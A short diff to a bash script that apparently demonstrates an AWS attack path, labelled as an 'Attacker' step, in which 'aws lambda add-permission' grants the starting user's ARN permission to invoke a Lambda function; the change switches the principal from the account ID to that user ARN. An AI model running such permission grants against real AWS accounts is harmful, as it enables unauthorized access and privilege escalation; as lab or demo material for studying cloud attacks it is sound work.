@@ -243,13 +243,13 @@ STATEMENT_ID="AllowUserInvoke"
 USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}"
 echo "Adding permission for: $USER_ARN"
 
-show_attack_cmd "Attacker" "aws lambda add-permission --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --statement-id \"$STATEMENT_ID\" --action \"lambda:InvokeFunction\" --principal \"$ACCOUNT_ID\" --source-arn \"$USER_ARN\" --output json"
+show_attack_cmd "Attacker" "aws lambda add-permission --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --statement-id \"$STATEMENT_ID\" --action \"lambda:InvokeFunction\" --principal \"$USER_ARN\" --source-arn \"$USER_ARN\" --output json"
 aws lambda add-permission \
     --region $AWS_REGION \
     --function-name "$LAMBDA_FUNCTION_NAME" \
     --statement-id "$STATEMENT_ID" \
     --action "lambda:InvokeFunction" \
-    --principal "$ACCOUNT_ID" \
+    --principal "$USER_ARN" \
     --source-arn "$USER_ARN" \
     --output json > /dev/null
 
